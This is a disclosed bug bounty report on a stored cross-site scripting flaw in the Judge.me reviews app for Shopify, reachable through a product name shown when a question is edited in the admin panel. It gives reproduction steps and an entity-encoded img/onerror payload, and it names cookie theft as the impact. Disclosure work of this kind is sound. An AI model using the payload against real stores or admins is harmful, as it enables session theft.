# Stored XSS in Question edit from product name

## Report Details
- **Report ID**: 1416672
- **URL**: https://hackerone.com/reports/1416672
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-12-04T09:47:34.584Z
- **Disclosed**: 2022-03-31T14:02:29.856Z

## Reporter
- **Username**: chupa-chups
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: judgeme

## Vulnerability Information
Hi @judgeme!

Step to reproduce:

1. Log in to your shopify account and create product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`
2. Go to our store and write question to our product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`
3. Then go to Shopify admin/Judge.me Product Reviews/Questions and edit question. XSS triage

{F1533755}


POC video:

{F1533757}

## Impact

Cookie stealer

## Attachments
- POC.png
- POC1.mp4
